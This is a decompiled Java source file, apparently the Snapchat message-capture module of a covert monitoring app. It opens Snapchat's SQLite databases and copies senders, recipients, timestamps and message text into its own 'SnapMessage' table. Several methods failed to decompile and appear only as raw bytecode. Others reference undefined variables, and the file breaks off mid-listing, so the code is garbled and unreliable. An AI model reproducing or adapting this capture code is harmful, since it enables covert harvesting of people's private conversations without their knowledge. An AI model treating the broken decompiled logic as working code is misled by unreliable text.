package com.vvt.capture.snapchat;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;

public class c
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  private static SQLiteDatabase a(int paramInt, String paramString1, String paramString2)
  {
    Object localObject1 = null;
    SQLiteDatabase localSQLiteDatabase;
    if (0 == 0)
    {
      localObject2 = com.vvt.n.a.a(paramString1);
      if (localObject2 == null) {
        return localObject1;
      }
      i = 2;
      localObject3 = new Object[i];
      localSQLiteDatabase = null;
      localObject3[0] = localObject2;
      localObject3[1] = paramString2;
      localObject1 = String.format("%s/%s", (Object[])localObject3);
      boolean bool1 = a;
      if (!bool1) {}
    }
    Object localObject3 = a((String)localObject1, paramInt);
    int j = 5;
    Object localObject2 = localObject3;
    int i = j;
    while ((localObject2 == null) && (i > 0))
    {
      boolean bool2 = a;
      if (bool2) {}
      long l = 1000L;
      SystemClock.sleep(l);
      localSQLiteDatabase = a((String)localObject1, paramInt);
      int k = i + -1;
      i = k;
      localObject2 = localSQLiteDatabase;
    }
    localObject1 = localObject2;
    return (SQLiteDatabase)localObject1;
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    if (paramString != null) {
      bool = false;
    }
    try
    {
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
  
  public static SQLiteDatabase a(String paramString1, String paramString2)
  {
    if ((paramString1 == null) || (paramString2 == null))
    {
      boolean bool = a;
      if (bool) {}
      bool = false;
    }
    int i;
    for (SQLiteDatabase localSQLiteDatabase = null;; localSQLiteDatabase = a(i, paramString1, paramString2))
    {
      return localSQLiteDatabase;
      i = 17;
    }
  }
  
  private static String a()
  {
    Object[] arrayOfObject = new Object[11];
    arrayOfObject[0] = "SnapMessage";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "snap_id";
    arrayOfObject[3] = "timestamp";
    arrayOfObject[4] = "media_type";
    arrayOfObject[5] = "conversation_id";
    arrayOfObject[6] = "sender";
    arrayOfObject[7] = "recipient";
    arrayOfObject[8] = "duration";
    arrayOfObject[9] = "text";
    arrayOfObject[10] = "send_receive_status";
    return String.format("CREATE TABLE IF NOT EXISTS  %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s TEXT UNIQUE ON CONFLICT IGNORE, %4$s INTEGER, %5$s INTEGER, %6$s TEXT, %7$s TEXT DEFAULT NULL, %8$s TEXT DEFAULT NULL, %9$s INTEGER, %10$s TEXT DEFAULT NULL, %11$s TEXT)", arrayOfObject);
  }
  
  /* Error */
  private static void a(SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: istore_1
    //   2: iconst_0
    //   3: istore_2
    //   4: aconst_null
    //   5: astore_3
    //   6: ldc 92
    //   8: astore 4
    //   10: iconst_1
    //   11: istore 5
    //   13: iload 5
    //   15: anewarray 4	java/lang/Object
    //   18: astore 6
    //   20: aconst_null
    //   21: astore 7
    //   23: ldc 94
    //   25: astore 8
    //   27: aload 6
    //   29: iconst_0
    //   30: aload 8
    //   32: aastore
    //   33: aload 4
    //   35: aload 6
    //   37: invokestatic 32	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   40: astore 4
    //   42: iconst_0
    //   43: istore 5
    //   45: aconst_null
    //   46: astore 6
    //   48: aload_0
    //   49: aload 4
    //   51: aconst_null
    //   52: invokevirtual 98	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   55: astore 4
    //   57: aload 4
    //   59: ifnull +363 -> 422
    //   62: ldc 65
    //   64: astore 6
    //   66: aload 4
    //   68: aload 6
    //   70: invokeinterface 104 2 0
    //   75: istore 5
    //   77: iload 5
    //   79: iload_1
    //   80: if_icmpeq +478 -> 558
    //   83: ldc 65
    //   85: astore 6
    //   87: aload 6
    //   89: astore 9
    //   91: ldc 81
    //   93: astore 6
    //   95: aload 4
    //   97: aload 6
    //   99: invokeinterface 104 2 0
    //   104: istore 5
    //   106: iload 5
    //   108: iload_1
    //   109: if_icmpeq +326 -> 435
    //   112: ldc 81
    //   114: astore 6
    //   116: aload 6
    //   118: astore 10
    //   120: ldc 78
    //   122: astore 6
    //   124: aload 4
    //   126: aload 6
    //   128: invokeinterface 104 2 0
    //   133: istore 5
    //   135: iload 5
    //   137: iload_1
    //   138: if_icmpeq +408 -> 546
    //   141: ldc 78
    //   143: astore 6
    //   145: aload 6
    //   147: astore 11
    //   149: ldc 90
    //   151: astore 6
    //   153: aload 4
    //   155: aload 6
    //   157: invokeinterface 104 2 0
    //   162: istore 5
    //   164: iload 5
    //   166: iload_1
    //   167: if_icmpeq +373 -> 540
    //   170: ldc 90
    //   172: astore 6
    //   174: aload 6
    //   176: astore 12
    //   178: ldc 70
    //   180: astore 6
    //   182: aload 4
    //   184: aload 6
    //   186: invokeinterface 104 2 0
    //   191: istore 5
    //   193: iload 5
    //   195: iload_1
    //   196: if_icmpeq +338 -> 534
    //   199: ldc 70
    //   201: astore 6
    //   203: aload 6
    //   205: astore 8
    //   207: ldc 87
    //   209: astore 6
    //   211: aload 4
    //   213: aload 6
    //   215: invokeinterface 104 2 0
    //   220: istore 5
    //   222: iload 5
    //   224: iload_1
    //   225: if_icmpeq +303 -> 528
    //   228: ldc 87
    //   230: astore 6
    //   232: aload 6
    //   234: astore 7
    //   236: ldc 75
    //   238: astore 6
    //   240: aload 4
    //   242: aload 6
    //   244: invokeinterface 104 2 0
    //   249: istore 5
    //   251: iload 5
    //   253: iload_1
    //   254: if_icmpeq +265 -> 519
    //   257: ldc 75
    //   259: astore 6
    //   261: ldc 106
    //   263: astore 13
    //   265: aload 4
    //   267: aload 13
    //   269: invokeinterface 104 2 0
    //   274: istore 14
    //   276: iload 14
    //   278: iload_1
    //   279: if_icmpeq +6 -> 285
    //   282: ldc 106
    //   284: astore_3
    //   285: aload 9
    //   287: ifnull +135 -> 422
    //   290: aload 10
    //   292: ifnull +130 -> 422
    //   295: aload 11
    //   297: ifnull +125 -> 422
    //   300: aload 12
    //   302: ifnull +120 -> 422
    //   305: aload 8
    //   307: ifnull +115 -> 422
    //   310: aload 7
    //   312: ifnull +110 -> 422
    //   315: aload 6
    //   317: ifnull +105 -> 422
    //   320: aload_3
    //   321: ifnull +101 -> 422
    //   324: ldc 108
    //   326: astore 13
    //   328: bipush 9
    //   330: istore_1
    //   331: iload_1
    //   332: anewarray 4	java/lang/Object
    //   335: astore 15
    //   337: aload 15
    //   339: iconst_0
    //   340: aload_3
    //   341: aastore
    //   342: iconst_1
    //   343: istore_2
    //   344: aload 15
    //   346: iload_2
    //   347: aload 7
    //   349: aastore
    //   350: iconst_2
    //   351: istore_2
    //   352: aload 15
    //   354: iload_2
    //   355: aload 9
    //   357: aastore
    //   358: iconst_3
    //   359: istore_2
    //   360: aload 15
    //   362: iload_2
    //   363: aload 10
    //   365: aastore
    //   366: iconst_4
    //   367: istore_2
    //   368: aload 15
    //   370: iload_2
    //   371: aload 11
    //   373: aastore
    //   374: iconst_5
    //   375: istore_2
    //   376: aload 15
    //   378: iload_2
    //   379: aload 12
    //   381: aastore
    //   382: bipush 6
    //   384: istore_2
    //   385: aload 15
    //   387: iload_2
    //   388: aload 8
    //   390: aastore
    //   391: bipush 7
    //   393: istore_2
    //   394: aload 15
    //   396: iload_2
    //   397: aload 7
    //   399: aastore
    //   400: bipush 8
    //   402: istore_2
    //   403: aload 15
    //   405: iload_2
    //   406: aload 6
    //   408: aastore
    //   409: aload 13
    //   411: aload 15
    //   413: invokestatic 32	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   416: astore_3
    //   417: aload_0
    //   418: aload_3
    //   419: invokevirtual 112	android/database/sqlite/SQLiteDatabase:execSQL	(Ljava/lang/String;)V
    //   422: aload 4
    //   424: ifnull +10 -> 434
    //   427: aload 4
    //   429: invokeinterface 116 1 0
    //   434: return
    //   435: ldc 118
    //   437: astore 6
    //   439: aload 4
    //   441: aload 6
    //   443: invokeinterface 104 2 0
    //   448: istore 5
    //   450: iload 5
    //   452: iload_1
    //   453: if_icmpeq +99 -> 552
    //   456: ldc 118
    //   458: astore 6
    //   460: aload 6
    //   462: astore 10
    //   464: goto -344 -> 120
    //   467: astore 4
    //   469: aconst_null
    //   470: astore 4
    //   472: getstatic 17	com/vvt/capture/snapchat/MyUncaughtExceptionHandler:removeFromPath	Z
    //   475: istore_2
    //   476: iload_2
    //   477: ifeq +3 -> 480
    //   480: aload 4
    //   482: ifnull -48 -> 434
    //   485: goto -58 -> 427
    //   488: astore 4
    //   490: aload_3
    //   491: ifnull +9 -> 500
    //   494: aload_3
    //   495: invokeinterface 116 1 0
    //   500: aload 4
    //   502: athrow
    //   503: astore 16
    //   505: aload 4
    //   507: astore_3
    //   508: aload 16
    //   510: astore 4
    //   512: goto -22 -> 490
    //   515: astore_3
    //   516: goto -44 -> 472
    //   519: iconst_0
    //   520: istore 5
    //   522: aconst_null
    //   523: astore 6
    //   525: goto -264 -> 261
    //   528: aconst_null
    //   529: astore 7
    //   531: goto -295 -> 236
    //   534: aconst_null
    //   535: astore 8
    //   537: goto -330 -> 207
    //   540: aconst_null
    //   541: astore 12
    //   543: goto -365 -> 178
    //   546: aconst_null
    //   547: astore 11
    //   549: goto -400 -> 149
    //   552: aconst_null
    //   553: astore 10
    //   555: goto -435 -> 120
    //   558: aconst_null
    //   559: astore 9
    //   561: goto -470 -> 91
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	564	0	paramSQLiteDatabase	SQLiteDatabase
    //   1	453	1	i	int
    //   3	403	2	j	int
    //   475	2	2	bool	boolean
    //   5	503	3	localObject1	Object
    //   515	1	3	localException1	Exception
    //   8	432	4	localObject2	Object
    //   467	1	4	localException2	Exception
    //   470	11	4	localObject3	Object
    //   488	18	4	localObject4	Object
    //   510	1	4	localObject5	Object
    //   11	510	5	k	int
    //   18	506	6	localObject6	Object
    //   21	509	7	localObject7	Object
    //   25	511	8	localObject8	Object
    //   89	471	9	localObject9	Object
    //   118	436	10	localObject10	Object
    //   147	401	11	localObject11	Object
    //   176	366	12	localObject12	Object
    //   263	147	13	str	String
    //   274	6	14	m	int
    //   335	77	15	arrayOfObject	Object[]
    //   503	6	16	localObject13	Object
    // Exception table:
    //   from	to	target	type
    //   13	18	467	java/lang/Exception
    //   30	33	467	java/lang/Exception
    //   35	40	467	java/lang/Exception
    //   51	55	467	java/lang/Exception
    //   13	18	488	finally
    //   30	33	488	finally
    //   35	40	488	finally
    //   51	55	488	finally
    //   68	75	503	finally
    //   97	104	503	finally
    //   126	133	503	finally
    //   155	162	503	finally
    //   184	191	503	finally
    //   213	220	503	finally
    //   242	249	503	finally
    //   267	274	503	finally
    //   331	335	503	finally
    //   340	342	503	finally
    //   347	350	503	finally
    //   355	358	503	finally
    //   363	366	503	finally
    //   371	374	503	finally
    //   379	382	503	finally
    //   388	391	503	finally
    //   397	400	503	finally
    //   406	409	503	finally
    //   411	416	503	finally
    //   418	422	503	finally
    //   441	448	503	finally
    //   472	475	503	finally
    //   68	75	515	java/lang/Exception
    //   97	104	515	java/lang/Exception
    //   126	133	515	java/lang/Exception
    //   155	162	515	java/lang/Exception
    //   184	191	515	java/lang/Exception
    //   213	220	515	java/lang/Exception
    //   242	249	515	java/lang/Exception
    //   267	274	515	java/lang/Exception
    //   331	335	515	java/lang/Exception
    //   340	342	515	java/lang/Exception
    //   347	350	515	java/lang/Exception
    //   355	358	515	java/lang/Exception
    //   363	366	515	java/lang/Exception
    //   371	374	515	java/lang/Exception
    //   379	382	515	java/lang/Exception
    //   388	391	515	java/lang/Exception
    //   397	400	515	java/lang/Exception
    //   406	409	515	java/lang/Exception
    //   411	416	515	java/lang/Exception
    //   418	422	515	java/lang/Exception
    //   441	448	515	java/lang/Exception
  }
  
  public static void a(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    localObject1 = null;
    try
    {
      localObject1 = d(paramString);
      String str;
      boolean bool2;
      if ((localObject1 == null) || (localObject2 != null)) {
        ((SQLiteDatabase)localObject2).close();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        try
        {
          str = a();
          ((SQLiteDatabase)localObject1).execSQL(str);
          a((SQLiteDatabase)localObject1);
          b((SQLiteDatabase)localObject1);
          c((SQLiteDatabase)localObject1);
          if (localObject1 != null) {
            ((SQLiteDatabase)localObject1).close();
          }
          bool1 = a;
          if (bool1) {}
          return;
        }
        finally
        {
          Object localObject2 = localObject1;
          localObject1 = localObject4;
          continue;
        }
        localException = localException;
        bool2 = b;
        if ((bool2) && (localObject1 == null)) {}
      }
    }
    finally
    {
      localObject3 = finally;
      bool2 = false;
      localObject2 = null;
      localObject1 = localObject3;
    }
    throw ((Throwable)localObject1);
  }
  
  private static String b()
  {
    Object[] arrayOfObject = new Object[0];
    return String.format("SELECT DISTINCT tbl_name FROM sqlite_master WHERE tbl_name = ?", arrayOfObject);
  }
  
  /* Error */
  private static void b(SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: istore_1
    //   2: iconst_0
    //   3: istore_2
    //   4: aconst_null
    //   5: astore_3
    //   6: ldc 92
    //   8: astore 4
    //   10: iconst_1
    //   11: istore 5
    //   13: iload 5
    //   15: anewarray 4	java/lang/Object
    //   18: astore 6
    //   20: iconst_0
    //   21: istore 7
    //   23: aconst_null
    //   24: astore 8
    //   26: ldc -116
    //   28: astore 9
    //   30: aload 6
    //   32: iconst_0
    //   33: aload 9
    //   35: aastore
    //   36: aload 4
    //   38: aload 6
    //   40: invokestatic 32	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   43: astore 4
    //   45: iconst_0
    //   46: istore 5
    //   48: aconst_null
    //   49: astore 6
    //   51: aload_0
    //   52: aload 4
    //   54: aconst_null
    //   55: invokevirtual 98	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   58: astore 4
    //   60: aload 4
    //   62: ifnull +278 -> 340
    //   65: ldc 65
    //   67: astore 6
    //   69: aload 4
    //   71: aload 6
    //   73: invokeinterface 104 2 0
    //   78: istore 5
    //   80: iload 5
    //   82: iload_1
    //   83: if_icmpeq +358 -> 441
    //   86: ldc 65
    //   88: astore 6
    //   90: aload 6
    //   92: astore 10
    //   94: ldc -114
    //   96: astore 6
    //   98: aload 4
    //   100: aload 6
    //   102: invokeinterface 104 2 0
    //   107: istore 5
    //   109: iload 5
    //   111: iload_1
    //   112: if_icmpeq +320 -> 432
    //   115: ldc -114
    //   117: astore 6
    //   119: aload 6
    //   121: astore 11
    //   123: ldc -112
    //   125: astore 6
    //   127: aload 4
    //   129: aload 6
    //   131: invokeinterface 104 2 0
    //   136: istore 5
    //   138: iload 5
    //   140: iload_1
    //   141: if_icmpeq +282 -> 423
    //   144: ldc -112
    //   146: astore 6
    //   148: aload 6
    //   150: astore 9
    //   152: ldc -110
    //   154: astore 6
    //   156: aload 4
    //   158: aload 6
    //   160: invokeinterface 104 2 0
    //   165: istore 5
    //   167: iload 5
    //   169: iload_1
    //   170: if_icmpeq +244 -> 414
    //   173: ldc -110
    //   175: astore 6
    //   177: aload 6
    //   179: astore 8
    //   181: ldc -108
    //   183: astore 6
    //   185: aload 4
    //   187: aload 6
    //   189: invokeinterface 104 2 0
    //   194: istore 5
    //   196: iload 5
    //   198: iload_1
    //   199: if_icmpeq +206 -> 405
    //   202: ldc -108
    //   204: astore 6
    //   206: ldc -106
    //   208: astore 12
    //   210: aload 4
    //   212: aload 12
    //   214: invokeinterface 104 2 0
    //   219: istore 13
    //   221: iload 13
    //   223: iload_1
    //   224: if_icmpeq +6 -> 230
    //   227: ldc -106
    //   229: astore_3
    //   230: aload 10
    //   232: ifnull +108 -> 340
    //   235: aload 11
    //   237: ifnull +103 -> 340
    //   240: aload 9
    //   242: ifnull +98 -> 340
    //   245: aload 8
    //   247: ifnull +93 -> 340
    //   250: aload 6
    //   252: ifnull +88 -> 340
    //   255: aload_3
    //   256: ifnull +84 -> 340
    //   259: ldc -104
    //   261: astore 12
    //   263: bipush 6
    //   265: istore_1
    //   266: iload_1
    //   267: anewarray 4	java/lang/Object
    //   270: astore 14
    //   272: aload 14
    //   274: iconst_0
    //   275: aload 10
    //   277: aastore
    //   278: iconst_1
    //   279: istore 15
    //   281: aload 14
    //   283: iload 15
    //   285: aload 11
    //   287: aastore
    //   288: iconst_2
    //   289: istore 16
    //   291: aload 14
    //   293: iload 16
    //   295: aload 9
    //   297: aastore
    //   298: iconst_3
    //   299: istore 17
    //   301: aload 14
    //   303: iload 17
    //   305: aload 8
    //   307: aastore
    //   308: iconst_4
    //   309: istore 7
    //   311: aload 14
    //   313: iload 7
    //   315: aload 6
    //   317: aastore
    //   318: iconst_5
    //   319: istore 5
    //   321: aload 14
    //   323: iload 5
    //   325: aload_3
    //   326: aastore
    //   327: aload 12
    //   329: aload 14
    //   331: invokestatic 32	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   334: astore_3
    //   335: aload_0
    //   336: aload_3
    //   337: invokevirtual 112	android/database/sqlite/SQLiteDatabase:execSQL	(Ljava/lang/String;)V
    //   340: aload 4
    //   342: ifnull +10 -> 352
    //   345: aload 4
    //   347: invokeinterface 116 1 0
    //   352: return
    //   353: astore 4
    //   355: aconst_null
    //   356: astore 4
    //   358: getstatic 17	com/vvt/capture/snapchat/MyUncaughtExceptionHandler:removeFromPath	Z
    //   361: istore_2
    //   362: iload_2
    //   363: ifeq +3 -> 366
    //   366: aload 4
    //   368: ifnull -16 -> 352
    //   371: goto -26 -> 345
    //   374: astore 4
    //   376: aload_3
    //   377: ifnull +9 -> 386
    //   380: aload_3
    //   381: invokeinterface 116 1 0
    //   386: aload 4
    //   388: athrow
    //   389: astore 18
    //   391: aload 4
    //   393: astore_3
    //   394: aload 18
    //   396: astore 4
    //   398: goto -22 -> 376
    //   401: astore_3
    //   402: goto -44 -> 358
    //   405: iconst_0
    //   406: istore 5
    //   408: aconst_null
    //   409: astore 6
    //   411: goto -205 -> 206
    //   414: iconst_0
    //   415: istore 7
    //   417: aconst_null
    //   418: astore 8
    //   420: goto -239 -> 181
    //   423: iconst_0
    //   424: istore 17
    //   426: aconst_null
    //   427: astore 9
    //   429: goto -277 -> 152
    //   432: iconst_0
    //   433: istore 16
    //   435: aconst_null
    //   436: astore 11
    //   438: goto -315 -> 123
    //   441: iconst_0
    //   442: istore 15
    //   444: aconst_null
    //   445: astore 10
    //   447: goto -353 -> 94
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	450	0	paramSQLiteDatabase	SQLiteDatabase
    //   1	266	1	i	int
    //   3	360	2	bool	boolean
    //   5	389	3	localObject1	Object
    //   401	1	3	localException1	Exception
    //   8	338	4	localObject2	Object
    //   353	1	4	localException2	Exception
    //   356	11	4	localObject3	Object
    //   374	18	4	localObject4	Object
    //   396	1	4	localObject5	Object
    //   11	396	5	j	int
    //   18	392	6	localObject6	Object
    //   21	395	7	k	int
    //   24	395	8	localObject7	Object
    //   28	400	9	localObject8	Object
    //   92	354	10	localObject9	Object
    //   121	316	11	localObject10	Object
    //   208	120	12	str	String
    //   219	6	13	m	int
    //   270	60	14	arrayOfObject	Object[]
    //   279	164	15	n	int
    //   289	145	16	i1	int
    //   299	126	17	i2	int
    //   389	6	18	localObject11	Object
    // Exception table:
    //   from	to	target	type
    //   13	18	353	java/lang/Exception
    //   33	36	353	java/lang/Exception
    //   38	43	353	java/lang/Exception
    //   54	58	353	java/lang/Exception
    //   13	18	374	finally
    //   33	36	374	finally
    //   38	43	374	finally
    //   54	58	374	finally
    //   71	78	389	finally
    //   100	107	389	finally
    //   129	136	389	finally
    //   158	165	389	finally
    //   187	194	389	finally
    //   212	219	389	finally
    //   266	270	389	finally
    //   275	278	389	finally
    //   285	288	389	finally
    //   295	298	389	finally
    //   305	308	389	finally
    //   315	318	389	finally
    //   325	327	389	finally
    //   329	334	389	finally
    //   336	340	389	finally
    //   358	361	389	finally
    //   71	78	401	java/lang/Exception
    //   100	107	401	java/lang/Exception
    //   129	136	401	java/lang/Exception
    //   158	165	401	java/lang/Exception
    //   187	194	401	java/lang/Exception
    //   212	219	401	java/lang/Exception
    //   266	270	401	java/lang/Exception
    //   275	278	401	java/lang/Exception
    //   285	288	401	java/lang/Exception
    //   295	298	401	java/lang/Exception
    //   305	308	401	java/lang/Exception
    //   315	318	401	java/lang/Exception
    //   325	327	401	java/lang/Exception
    //   329	334	401	java/lang/Exception
    //   336	340	401	java/lang/Exception
  }
  
  /* Error */
  public static boolean b(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: iconst_1
    //   3: istore_2
    //   4: iconst_0
    //   5: istore_3
    //   6: aconst_null
    //   7: astore 4
    //   9: aload_0
    //   10: invokestatic 154	com/vvt/capture/snapchat/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   13: astore 5
    //   15: aload 5
    //   17: ifnull +57 -> 74
    //   20: invokestatic 156	com/vvt/capture/snapchat/MyUncaughtExceptionHandler:removeFromPath	()Ljava/lang/String;
    //   23: astore 6
    //   25: iconst_1
    //   26: istore 7
    //   28: iload 7
    //   30: anewarray 28	java/lang/String
    //   33: astore 8
    //   35: ldc 63
    //   37: astore 9
    //   39: aload 8
    //   41: iconst_0
    //   42: aload 9
    //   44: aastore
    //   45: aload 5
    //   47: aload 6
    //   49: aload 8
    //   51: invokevirtual 98	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   54: astore_1
    //   55: aload_1
    //   56: ifnull +18 -> 74
    //   59: aload_1
    //   60: invokeinterface 160 1 0
    //   65: istore 10
    //   67: iload 10
    //   69: ifle +5 -> 74
    //   72: iload_2
    //   73: istore_3
    //   74: aload_1
    //   75: ifnull +9 -> 84
    //   78: aload_1
    //   79: invokeinterface 116 1 0
    //   84: aload 5
    //   86: ifnull +8 -> 94
    //   89: aload 5
    //   91: invokevirtual 136	android/database/sqlite/SQLiteDatabase:close	()V
    //   94: iload_3
    //   95: ireturn
    //   96: astore 5
    //   98: aconst_null
    //   99: astore 5
    //   101: getstatic 12	com/vvt/capture/snapchat/MyUncaughtExceptionHandler:a	Z
    //   104: istore_2
    //   105: iload_2
    //   106: ifeq +3 -> 109
    //   109: aload_1
    //   110: ifnull +9 -> 119
    //   113: aload_1
    //   114: invokeinterface 116 1 0
    //   119: aload 5
    //   121: ifnull -27 -> 94
    //   124: goto -35 -> 89
    //   127: astore 4
    //   129: aconst_null
    //   130: astore 5
    //   132: aload_1
    //   133: ifnull +9 -> 142
    //   136: aload_1
    //   137: invokeinterface 116 1 0
    //   142: aload 5
    //   144: ifnull +8 -> 152
    //   147: aload 5
    //   149: invokevirtual 136	android/database/sqlite/SQLiteDatabase:close	()V
    //   152: aload 4
    //   154: athrow
    //   155: astore 4
    //   157: goto -25 -> 132
    //   160: pop
    //   161: goto -60 -> 101
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	164	0	paramString	String
    //   1	136	1	localCursor	android.database.Cursor
    //   3	103	2	bool1	boolean
    //   5	90	3	bool2	boolean
    //   7	1	4	localObject1	Object
    //   127	26	4	localObject2	Object
    //   155	1	4	localObject3	Object
    //   13	77	5	localSQLiteDatabase	SQLiteDatabase
    //   96	1	5	localException1	Exception
    //   99	49	5	localObject4	Object
    //   23	25	6	str1	String
    //   26	3	7	i	int
    //   33	17	8	arrayOfString	String[]
    //   37	6	9	str2	String
    //   65	3	10	j	int
    //   160	1	15	localException2	Exception
    // Exception table:
    //   from	to	target	type
    //   9	13	96	java/lang/Exception
    //   9	13	127	finally
    //   20	23	155	finally
    //   28	33	155	finally
    //   42	45	155	finally
    //   49	54	155	finally
    //   59	65	155	finally
    //   101	104	155	finally
    //   20	23	160	java/lang/Exception
    //   28	33	160	java/lang/Exception
    //   42	45	160	java/lang/Exception
    //   49	54	160	java/lang/Exception
    //   59	65	160	java/lang/Exception
  }
  
  public static SQLiteDatabase c(String paramString)
  {
    int i = 1;
    Object localObject;
    if (paramString == null)
    {
      boolean bool1 = a;
      if (bool1) {}
      bool1 = false;
      localObject = null;
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject;
      SQLiteDatabase localSQLiteDatabase1 = a(paramString, i);
      int j = 5;
      localObject = localSQLiteDatabase1;
      int m = j;
      while ((localObject == null) && (m > 0))
      {
        boolean bool2 = a;
        if (bool2) {}
        long l = 100;
        SystemClock.sleep(l);
        SQLiteDatabase localSQLiteDatabase2 = a(paramString, i);
        int k = m + -1;
        m = k;
        localObject = localSQLiteDatabase2;
      }
    }
  }
  
  /* Error */
  private static void c(SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: istore_1
    //   2: iconst_0
    //   3: istore_2
    //   4: aconst_null
    //   5: astore_3
    //   6: ldc 92
    //   8: astore 4
    //   10: iconst_1
    //   11: istore 5
    //   13: iload 5
    //   15: anewarray 4	java/lang/Object
    //   18: astore 6
    //   20: iconst_0
    //   21: istore 7
    //   23: aconst_null
    //   24: astore 8
    //   26: ldc -92
    //   28: astore 9
    //   30: aload 6
    //   32: iconst_0
    //   33: aload 9
    //   35: aastore
    //   36: aload 4
    //   38: aload 6
    //   40: invokestatic 32	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   43: astore 4
    //   45: iconst_0
    //   46: istore 5
    //   48: aconst_null
    //   49: astore 6
    //   51: aload_0
    //   52: aload 4
    //   54: aconst_null
    //   55: invokevirtual 98	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   58: astore 4
    //   60: aload 4
    //   62: ifnull +278 -> 340
    //   65: ldc 65
    //   67: astore 6
    //   69: aload 4
    //   71: aload 6
    //   73: invokeinterface 104 2 0
    //   78: istore 5
    //   80: iload 5
    //   82: iload_1
    //   83: if_icmpeq +358 -> 441
    //   86: ldc 65
    //   88: astore 6
    //   90: aload 6
    //   92: astore 10
    //   94: ldc -90
    //   96: astore 6
    //   98: aload 4
    //   100: aload 6
    //   102: invokeinterface 104 2 0
    //   107: istore 5
    //   109: iload 5
    //   111: iload_1
    //   112: if_icmpeq +320 -> 432
    //   115: ldc -90
    //   117: astore 6
    //   119: aload 6
    //   121: astore 11
    //   123: ldc -112
    //   125: astore 6
    //   127: aload 4
    //   129: aload 6
    //   131: invokeinterface 104 2 0
    //   136: istore 5
    //   138: iload 5
    //   140: iload_1
    //   141: if_icmpeq +282 -> 423
    //   144: ldc -112
    //   146: astore 6
    //   148: aload 6
    //   150: astore 9
    //   152: ldc -110
    //   154: astore 6
    //   156: aload 4
    //   158: aload 6
    //   160: invokeinterface 104 2 0
    //   165: istore 5
    //   167: iload 5
    //   169: iload_1
    //   170: if_icmpeq +244 -> 414
    //   173: ldc -110
    //   175: astore 6
    //   177: aload 6
    //   179: astore 8
    //   181: ldc -88
    //   183: astore 6
    //   185: aload 4
    //   187: aload 6
    //   189: invokeinterface 104 2 0
    //   194: istore 5
    //   196: iload 5
    //   198: iload_1
    //   199: if_icmpeq +206 -> 405
    //   202: ldc -88
    //   204: astore 6
    //   206: ldc -106
    //   208: astore 12
    //   210: aload 4
    //   212: aload 12
    //   214: invokeinterface 104 2 0
    //   219: istore 13
    //   221: iload 13
    //   223: iload_1
    //   224: if_icmpeq +6 -> 230
    //   227: ldc -106
    //   229: astore_3
    //   230: aload 10
    //   232: ifnull +108 -> 340
    //   235: aload 11
    //   237: ifnull +103 -> 340
    //   240: aload 9
    //   242: ifnull +98 -> 340
    //   245: aload 8
    //   247: ifnull +93 -> 340
    //   250: aload 6
    //   252: ifnull +88 -> 340
    //   255: aload_3
    //   256: ifnull +84 -> 340
    //   259: ldc -86
    //   261: astore 12
    //   263: bipush 6
    //   265: istore_1
    //   266: iload_1
    //   267: anewarray 4	java/lang/Object
    //   270: astore 14
    //   272: aload 14
    //   274: iconst_0
    //   275: aload 10
    //   277: aastore
    //   278: iconst_1
    //   279: istore 15
    //   281: aload 14
    //   283: iload 15
    //   285: aload 11
    //   287: aastore
    //   288: iconst_2
    //   289: istore 16
    //   291: aload 14
    //   293: iload 16
    //   295: aload 9
    //   297: aastore
    //   298: iconst_3
    //   299: istore 17
    //   301: aload 14
    //   303: iload 17
    //   305: aload 8
    //   307: aastore
    //   308: iconst_4
    //   309: istore 7
    //   311: aload 14
    //   313: iload 7
    //   315: aload 6
    //   317: aastore
    //   318: iconst_5
    //   319: istore 5
    //   321: aload 14
    //   323: iload 5
    //   325: aload_3
    //   326: aastore
    //   327: aload 12
    //   329: aload 14
    //   331: invokestatic 32	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   334: astore_3
    //   335: aload_0
    //   336: aload_3
    //   337: invokevirtual 112	android/database/sqlite/SQLiteDatabase:execSQL	(Ljava/lang/String;)V
    //   340: aload 4
    //   342: ifnull +10 -> 352
    //   345: aload 4
    //   347: invokeinterface 116 1 0
    //   352: return
    //   353: astore 4
    //   355: aconst_null
    //   356: astore 4
    //   358: getstatic 17	com/vvt/capture/snapchat/MyUncaughtExceptionHandler:removeFromPath	Z
